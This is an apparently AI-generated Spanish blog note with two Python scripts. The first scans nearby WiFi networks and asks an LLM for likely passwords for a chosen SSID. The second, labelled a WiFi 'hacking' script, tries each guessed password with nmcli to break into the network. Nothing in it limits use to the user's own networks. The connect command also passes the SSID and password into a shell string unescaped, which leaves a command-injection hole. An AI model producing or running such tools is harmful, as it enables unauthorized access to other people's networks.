---
audio: false
generated: true
image: false
lang: es
layout: post
model: x-ai/grok-4-fast
title: Generador de Contraseñas WiFi
translated: true
type: note
---

```python
#!/usr/bin/env python3
"""
Script Generador de Contraseñas WiFi
Escanea redes WiFi, permite al usuario seleccionar una, genera contraseñas sugeridas usando LLM y guarda en directorio @tmp.
Este script requiere acceso online para LLM. Usa un script offline separado para intentar conexiones con las contraseñas guardadas.
"""

import os
import sys
from get_wifi_list import get_wifi_list
from openrouter_client import call_openrouter_api

# Asegurar que el directorio @tmp existe
TMP_DIR = '@tmp'
os.makedirs(TMP_DIR, exist_ok=True)

def parse_wifi_list(wifi_output):
    """
    Analiza la salida de get_wifi_list para extraer SSIDs y detalles.
    Retorna una lista de diccionarios con 'index', 'ssid', 'full_line'.
    """
    networks = []
    lines = wifi_output.split('\n')
    current_ssid = None
    for i, line in enumerate(lines):
        if line.startswith('SSID: '):
            # Extraer SSID de la línea
            ssid_part = line.split('SSID: ')[1].split(',')[0].strip()
            current_ssid = ssid_part
            networks.append({
                'index': len(networks) + 1,
                'ssid': current_ssid,
                'full_line': line
            })
        elif current_ssid and line.strip().startswith('  '):
            # Añadir información adicional a la última red si es una sub-línea
            networks[-1]['full_line'] += '\n' + line
    return networks

def generate_password_suggestions(ssid, num_suggestions=10, model="deepseek-v3.2"):
    """
    Usa OpenRouter LLM para generar contraseñas sugeridas para el SSID dado.
    """
    prompt = f"Sugiere {num_suggestions} contraseñas posibles para una red WiFi llamada '{ssid}'. Hazlas plausibles basadas en patrones comunes, el nombre, o valores por defecto. Listalas numeradas, una por línea, sin explicaciones."
    try:
        response = call_openrouter_api(prompt, model=model)
        # Limpiar respuesta para extraer solo la lista
        lines = [line.strip() for line in response.split('\n') if line.strip() and line[0].isdigit()]
        passwords = [line.split('.', 1)[1].strip() if '.' in line else line for line in lines[:num_suggestions]]
        return passwords
    except Exception as e:
        print(f"Error generando contraseñas: {e}")
        return []

def save_passwords_to_file(ssid, passwords):
    """
    Guarda la lista de contraseñas en un archivo en el directorio @tmp.
    """
    filename = os.path.join(TMP_DIR, f"{ssid.replace(' ', '_')}_passwords.txt")
    with open(filename, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    print(f"Contraseñas guardadas en: {filename}")
    return filename

def main():
    print("=== Generador de Contraseñas WiFi ===")
    print()

    # Obtener lista WiFi
    print("Escaneando redes WiFi disponibles...")
    wifi_output = get_wifi_list()
    print("Redes WiFi Disponibles:")
    if wifi_output.startswith("No WiFi"):
        print(f"  {wifi_output}")
        sys.exit(1)

    # Analizar y mostrar lista numerada
    networks = parse_wifi_list(wifi_output)
    if not networks:
        print("No se encontraron redes.")
        sys.exit(1)

    for net in networks:
        print(f"{net['index']}. {net['full_line']}")

    # Entrada del usuario
    try:
        choice = int(input(f"\nSelecciona una red (1-{len(networks)}): "))
        if 1 <= choice <= len(networks):
            selected = networks[choice - 1]
            ssid = selected['ssid']
            print(f"\nSeleccionado: {ssid}")
        else:
            print("Selección inválida.")
            sys.exit(1)
    except ValueError:
        print("Entrada inválida.")
        sys.exit(1)

    # Generar contraseñas
    print(f"\nGenerando {10} sugerencias de contraseñas para '{ssid}'...")
    passwords = generate_password_suggestions(ssid)

    if passwords:
        print("Contraseñas sugeridas:")
        for i, pwd in enumerate(passwords, 1):
            print(f"{i}. {pwd}")
        # Guardar en archivo
        save_passwords_to_file(ssid, passwords)
    else:
        print("Error al generar contraseñas.")

    print("\nUsa un script offline separado para leer este archivo e intentar conexiones.")

if __name__ == "__main__":
    main()
```

Para el script de hacking offline (ej. `offline_hack_wifi.py`), puedes crearlo por separado para leer las contraseñas desde `@tmp/{ssid}_passwords.txt` e intentar conectarse usando herramientas como `nmcli` o `wpa_supplicant`. Aquí un esqueleto básico:

```python
#!/usr/bin/env python3
"""
Script Hacker WiFi Offline
Lee contraseñas guardadas e intenta conectarse a la WiFi seleccionada offline.
"""

import os
import subprocess
import sys

TMP_DIR = '@tmp'

def attempt_connect(ssid, password):
    """
    Intentar conectar a WiFi usando nmcli (o alternativa).
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Éxito con contraseña: {password}")
            return True
        else:
            print(f"Falló con contraseña: {password}")
            return False
    except Exception as e:
        print(f"Error intentando conectar: {e}")
        return False

def main():
    ssid_file = input("Ingresa el SSID o nombre completo del archivo en @tmp (ej., MiWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)
    
    if not os.path.exists(filepath):
        print("Archivo no encontrado.")
        sys.exit(1)
    
    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"Intentando conectar a '{ssid}'...")
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("Todas las contraseñas fallaron.")

if __name__ == "__main__":
    main()
```